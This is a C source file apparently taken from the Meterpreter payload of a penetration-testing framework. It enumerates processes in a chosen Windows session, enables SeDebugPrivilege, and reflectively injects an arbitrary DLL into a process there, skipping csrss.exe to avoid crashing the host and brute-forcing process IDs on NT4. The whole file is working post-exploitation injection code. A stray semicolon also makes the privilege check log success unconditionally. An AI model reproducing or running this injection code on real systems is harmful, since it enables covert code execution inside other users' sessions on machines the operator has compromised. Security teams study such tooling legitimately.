#include "precomp.h"
#include "common_metapi.h"
#include "session.h"

/*
 * Returns the session id associated with a process.
 * Returns -1 if we cant determine the session id (e.g. insufficient privileges).
 * Returns 0 by default on NT4.
 */
DWORD session_id( DWORD dwProcessId )
{
	DWORD dwSessionId = 0;

	met_api->win_api.kernel32.SetLastError(ERROR_PROC_NOT_FOUND);
	if( !met_api->win_api.kernel32.ProcessIdToSessionId( dwProcessId, &dwSessionId ) )
	{
		// ProcessIdToSessionId is absent on NT4, where session zero is the
		// historical fallback. Other failures still mean "unknown".
		if( met_api->win_api.kernel32.GetLastError() != ERROR_PROC_NOT_FOUND )
			dwSessionId = -1;
	}

	return dwSessionId;
}

/*
 * Returns the session id attached to the physical console.
 * Returns 0 by default on NT4 and 2000.
 */
DWORD session_activeid()
{
	return met_api->win_api.kernel32.WTSGetActiveConsoleSessionId();
}

/*
 * On NT4 its we bruteforce the process list as kernel32!CreateToolhelp32Snapshot is not available.
 */
DWORD _session_inject_bruteforce( DWORD dwSessionId, DLL_BUFFER * pDllBuffer, LPCSTR reflectiveLoader, char * cpCommandLine )
{
	DWORD dwResult = ERROR_INVALID_HANDLE;
	DWORD pid      = 0;

	do
	{
		for( pid=0 ; pid<0xFFFF ; pid++ )
		{
			HANDLE hProcess = NULL;

			hProcess = met_api->win_api.kernel32.OpenProcess( PROCESS_QUERY_INFORMATION, FALSE, pid );
			if( !hProcess )
				continue;

			met_api->win_api.kernel32.CloseHandle( hProcess );

			if( dwSessionId == session_id( pid ) )
			{
				dwResult = ps_inject( pid, pDllBuffer, reflectiveLoader, cpCommandLine );
				if( dwResult == ERROR_SUCCESS )
				{
					dprintf( "[SESSION] _session_inject_bruteforce. Injected into process %d", pid );
					break;
				}
			}
		}

	} while( 0 );

	return dwResult;
}

/*
 * Inject an arbitrary DLL into a process running in specific Windows session.
 */
DWORD session_inject( DWORD dwSessionId, DLL_BUFFER * pDllBuffer, LPCSTR reflectiveLoader, char * cpCommandLine )
{
	DWORD dwResult                                     = ERROR_INVALID_HANDLE;
	HANDLE hProcessSnap                                = NULL;
	HANDLE hToken                                      = NULL;
	BOOL bUseBruteForce                                = TRUE;
	PROCESSENTRY32W pe32                                = {0};

	do
	{
		// If we can, get SeDebugPrivilege...
		if( met_api->win_api.advapi32.OpenProcessToken( met_api->win_api.kernel32.GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken ) )
		{
			TOKEN_PRIVILEGES priv = {0};

			priv.PrivilegeCount           = 1;
			priv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
			
			if( met_api->win_api.advapi32.LookupPrivilegeValueA( NULL, SE_DEBUG_NAME, &priv.Privileges[0].Luid ) )
			{
				if( met_api->win_api.advapi32.AdjustTokenPrivileges( hToken, FALSE, &priv, 0, NULL, NULL ) );
					dprintf("[SESSION] session_inject. Got SeDebugPrivilege!" );
			}

			met_api->win_api.kernel32.CloseHandle( hToken );
		}

		hProcessSnap = met_api->win_api.kernel32.CreateToolhelp32Snapshot( TH32CS_SNAPPROCESS, 0 );
		if( hProcessSnap == INVALID_HANDLE_VALUE )
			break;

		pe32.dwSize = sizeof( PROCESSENTRY32W );

		if( !met_api->win_api.kernel32.Process32FirstW( hProcessSnap, &pe32 ) )
			break;
				
		bUseBruteForce = FALSE;
		
		do
		{
			if( dwSessionId == session_id( pe32.th32ProcessID ) )
			{
				// On Windows 2008R2 we Blue Screen the box if we inject via APC injection 
				// into the target sessions instance of csrss.exe!!! so we filter it out...
				if (wcsstr(pe32.szExeFile, L"csrss.exe"))
					continue;

				dwResult = ps_inject( pe32.th32ProcessID, pDllBuffer, reflectiveLoader, cpCommandLine );
				if( dwResult == ERROR_SUCCESS )
				{
					dprintf( "[SESSION] session_inject. Injected into process %d (%s)", pe32.th32ProcessID, pe32.szExeFile );
					break;
				}
			}
		} while( met_api->win_api.kernel32.Process32NextW( hProcessSnap, &pe32 ) );

	} while( 0 );

	if( hProcessSnap )
		met_api->win_api.kernel32.CloseHandle( hProcessSnap );
	
	// On NT4 we must brute force the process list...
	if( bUseBruteForce )
		dwResult = _session_inject_bruteforce( dwSessionId, pDllBuffer, reflectiveLoader, cpCommandLine );

	return dwResult;
}

